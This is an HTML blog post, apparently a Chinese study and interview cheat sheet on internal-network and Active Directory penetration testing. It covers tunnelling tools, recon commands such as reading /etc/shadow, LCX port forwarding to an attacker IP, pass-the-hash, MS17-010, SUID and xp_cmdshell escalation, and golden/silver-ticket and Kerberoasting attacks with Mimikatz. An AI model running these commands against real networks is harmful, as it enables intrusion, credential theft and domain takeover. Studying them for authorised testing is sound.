@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>内网渗透与域渗透速查 | CX-5W 的安全笔记</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="内网渗透三大问：主机不出网怎么办？怎么横向？域怎么打？速查表一条线讲清。  一、三种出网场景三种打法★重点 面试高频    场景 技术 工具    能上网但连不上 NAT 穿透 FRP &#x2F; ngrok &#x2F; NPS   纯内网不出网 Socks 代理 EW &#x2F; reGeorg + Proxifier   数据被防火墙拦 隧道换协议 ICMP(pingtunnel) &amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透与域渗透速查">
+<meta property="og:url" content="https://cx-5w.github.io/security-notes/intranet-domain/index.html">
+<meta property="og:site_name" content="CX-5W 的安全笔记">
+<meta property="og:description" content="内网渗透三大问：主机不出网怎么办？怎么横向？域怎么打？速查表一条线讲清。  一、三种出网场景三种打法★重点 面试高频    场景 技术 工具    能上网但连不上 NAT 穿透 FRP &#x2F; ngrok &#x2F; NPS   纯内网不出网 Socks 代理 EW &#x2F; reGeorg + Proxifier   数据被防火墙拦 隧道换协议 ICMP(pingtunnel) &amp;">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-08-07T01:20:00.000Z">
+<meta property="article:modified_time" content="2026-08-06T16:40:08.953Z">
+<meta property="article:author" content="CX-5W">
+<meta property="article:tag" content="代理">
+<meta property="article:tag" content="域渗透">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="隧道">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="CX-5W 的安全笔记" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&family=Noto+Sans+SC:wght@400;500;600;700&display=swap" rel="stylesheet">
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">CX-5W 的安全笔记</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">Web 安全 · CTF · 渗透测试</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/security-notes/">安全笔记</a>
+        
+          <a class="main-nav-link" href="/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95">CTF题解</a>
+        
+          <a class="main-nav-link" href="/tools">工具</a>
+        
+          <a class="main-nav-link" href="/projects">项目</a>
+        
+          <a class="main-nav-link" href="/resume">简历</a>
+        
+          <a class="main-nav-link" href="/about">关于我</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          
+            <a class="nav-icon" target="_blank" rel="noopener" href="https://github.com/CX-5W"><span class="fa fa-github"></span></a>
+          
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS 订阅"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="搜索"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://cx-5w.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-security-notes-intranet-domain" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/security-notes/intranet-domain/" class="article-date">
+  <time class="dt-published" datetime="2026-08-07T01:20:00.000Z" itemprop="datePublished">2026-08-07</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">安全笔记</a>►<a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      内网渗透与域渗透速查
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>内网渗透三大问：主机不出网怎么办？怎么横向？域怎么打？速查表一条线讲清。</p>
+</blockquote>
+<h2 id="一、三种出网场景三种打法"><a href="#一、三种出网场景三种打法" class="headerlink" title="一、三种出网场景三种打法"></a>一、三种出网场景三种打法</h2><p><span class="badge-key">★重点</span> <span class="badge-interview">面试高频</span></p>
+<table>
+<thead>
+<tr>
+<th>场景</th>
+<th>技术</th>
+<th>工具</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>能上网但连不上</td>
+<td>NAT 穿透</td>
+<td>FRP &#x2F; ngrok &#x2F; NPS</td>
+</tr>
+<tr>
+<td>纯内网不出网</td>
+<td>Socks 代理</td>
+<td>EW &#x2F; reGeorg + Proxifier</td>
+</tr>
+<tr>
+<td>数据被防火墙拦</td>
+<td>隧道换协议</td>
+<td>ICMP(pingtunnel) &#x2F; DNS(CS)</td>
+</tr>
+</tbody></table>
+<p><strong>代理 vs 隧道</strong>：代理转发数据不换协议；隧道把数据加工成其他协议绕过过滤。</p>
+<h2 id="二、内网信息收集"><a href="#二、内网信息收集" class="headerlink" title="二、内网信息收集"></a>二、内网信息收集</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systeminfo                    # 系统+补丁</span><br><span class="line"><span class="built_in">net</span> user / <span class="built_in">net</span> localgroup administrators</span><br><span class="line">wmic                          # 查杀软</span><br><span class="line">netstat -ano                  # 异常连接</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd /etc/shadow</span><br><span class="line"><span class="built_in">who</span> / last</span><br><span class="line">netstat -anp</span><br></pre></td></tr></table></figure>
+
+<h2 id="三、端口转发与代理"><a href="#三、端口转发与代理" class="headerlink" title="三、端口转发与代理"></a>三、端口转发与代理</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># LCX：攻击机监听 → 目标机 slave → 攻击机 tran → 工具连接</span><br><span class="line">lcx.exe -listen <span class="number">2222</span></span><br><span class="line">lcx.exe -slave 攻击机IP <span class="number">2222</span> <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">3389</span></span><br><span class="line">lcx.exe -tran <span class="number">4444</span> <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">2222</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># EW 正向代理：目标机执行后，SocksCap/proxychains 连接</span></span><br><span class="line">ew -s ssocksd -l 1080</span><br></pre></td></tr></table></figure>
+
+<h2 id="四、横向渗透"><a href="#四、横向渗透" class="headerlink" title="四、横向渗透"></a>四、横向渗透</h2><ul>
+<li>口令复用（同一密码多台机器）。</li>
+<li>PTH 哈希传递：<code>psexec</code> &#x2F; Impacket（知道哈希即可认证）。</li>
+<li>永恒之蓝 MS17-010（445，老系统）。</li>
+<li>弱口令爆破 SMB&#x2F;3389&#x2F;SSH&#x2F;数据库。</li>
+<li>代理打通后，内网渗透 &#x3D; 公网渗透。</li>
+</ul>
+<h2 id="五、提权速查"><a href="#五、提权速查" class="headerlink" title="五、提权速查"></a>五、提权速查</h2><table>
+<thead>
+<tr>
+<th>系统</th>
+<th>手法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Windows</td>
+<td>补丁漏洞 EXP（systeminfo 查补丁）、服务缺陷、令牌窃取</td>
+</tr>
+<tr>
+<td>Linux</td>
+<td>SUID（<code>find / -perm -4000</code>）、内核漏洞、sudo 配置不当</td>
+</tr>
+<tr>
+<td>数据库</td>
+<td>MSSQL SA + <code>xp_cmdshell</code>、MySQL UDF&#x2F;写文件</td>
+</tr>
+</tbody></table>
+<h2 id="六、域渗透"><a href="#六、域渗透" class="headerlink" title="六、域渗透"></a>六、域渗透</h2><p><span class="badge-interview">面试高频</span> 工作组 vs 域：工作组无统一管理&#x2F;统一认证；域通过 DC（AD）统一管理。</p>
+<p><strong>Kerberos 认证链</strong>：<code>AS 验身份 → TGT(黄金票据) → TGS 换票 → ST(白银票据) → 服务放行</code>。</p>
+<table>
+<thead>
+<tr>
+<th>攻击</th>
+<th>前提</th>
+<th>效果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>PTH</td>
+<td>密码哈希</td>
+<td>直接认证登录</td>
+</tr>
+<tr>
+<td>PTT</td>
+<td>票据文件</td>
+<td>导入票据冒充身份</td>
+</tr>
+<tr>
+<td>黄金票据</td>
+<td>krbtgt 哈希+SID</td>
+<td>伪造 TGT，通吃全域（权限维持）</td>
+</tr>
+<tr>
+<td>白银票据</td>
+<td>目标服务账号哈希+SID</td>
+<td>伪造 ST，访问单个服务</td>
+</tr>
+<tr>
+<td>Kerberoasting</td>
+<td>域内普通用户</td>
+<td>拿服务票据离线爆破</td>
+</tr>
+</tbody></table>
+<p><strong>工具</strong>：Mimikatz（<code>kerberos::golden</code> &#x2F; <code>kerberos::ptt</code>）、Impacket、BloodHound、CS + Landon 插件。</p>
+<p><span class="badge-key">★重点</span> 记忆：<strong>定位域控 → 抓凭据 → PTH&#x2F;PTT 横向 → 拿 krbtgt 伪造黄金票据 → 控制全域</strong>。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://cx-5w.github.io/security-notes/intranet-domain/" data-id="cuid_Gc3RLKtDFTBjq_hn5sSC" data-title="内网渗透与域渗透速查" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%90%86/" rel="tag">代理</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8F%90%E6%9D%83/" rel="tag">提权</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9A%A7%E9%81%93/" rel="tag">隧道</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/security-notes/incident-response/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">前一篇</strong>
+      <div class="article-nav-title">
+        
+          应急响应速查
+        
+      </div>
+    </a>
+  
+  
+    <a href="/security-notes/pentest-checklist/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">渗透测试全流程速查</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">SQL注入</a> <a href="/tags/SSRF/" style="font-size: 10px;">SSRF</a> <a href="/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/tags/XXE/" style="font-size: 10px;">XXE</a> <a href="/tags/%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">上传</a> <a href="/tags/%E4%BB%A3%E7%90%86/" style="font-size: 10px;">代理</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 10px;">信息收集</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 10px;">命令执行</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 10px;">域渗透</a> <a href="/tags/%E5%BA%94%E6%80%A5/" style="font-size: 10px;">应急</a> <a href="/tags/%E6%8A%A4%E7%BD%91/" style="font-size: 10px;">护网</a> <a href="/tags/%E6%8A%A5%E5%91%8A/" style="font-size: 10px;">报告</a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size: 10px;">提权</a> <a href="/tags/%E6%9F%A5%E6%9D%80/" style="font-size: 10px;">查杀</a> <a href="/tags/%E6%B5%81%E7%A8%8B/" style="font-size: 10px;">流程</a> <a href="/tags/%E7%AD%89%E4%BF%9D/" style="font-size: 10px;">等保</a> <a href="/tags/%E9%9A%A7%E9%81%93/" style="font-size: 10px;">隧道</a> <a href="/tags/%E9%9D%A2%E8%AF%95/" style="font-size: 10px;">面试</a> <a href="/tags/%E9%A2%98%E5%BA%93/" style="font-size: 10px;">题库</a> <a href="/tags/%E9%AB%98%E9%A2%91/" style="font-size: 10px;">高频</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">安全笔记</a><span class="category-list-count">5</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/Web%E6%BC%8F%E6%B4%9E/">Web漏洞</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E9%9D%A2%E8%AF%95/">面试</a><span class="category-list-count">1</span></li></ul></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/08/">八月 2026</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/06/">六月 2026</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/security-notes/interview-100/">面试高频问答 100 题</a>
+          </li>
+        
+          <li>
+            <a href="/security-notes/incident-response/">应急响应速查</a>
+          </li>
+        
+          <li>
+            <a href="/security-notes/intranet-domain/">内网渗透与域渗透速查</a>
+          </li>
+        
+          <li>
+            <a href="/security-notes/pentest-checklist/">渗透测试全流程速查</a>
+          </li>
+        
+          <li>
+            <a href="/security-notes/payload-handbook/">Web 漏洞速查与 Payload 手册</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2026 CX-5W<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/security-notes/" class="mobile-nav-link">安全笔记</a>
+  
+    <a href="/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95" class="mobile-nav-link">CTF题解</a>
+  
+    <a href="/tools" class="mobile-nav-link">工具</a>
+  
+    <a href="/projects" class="mobile-nav-link">项目</a>
+  
+    <a href="/resume" class="mobile-nav-link">简历</a>
+  
+    <a href="/about" class="mobile-nav-link">关于我</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
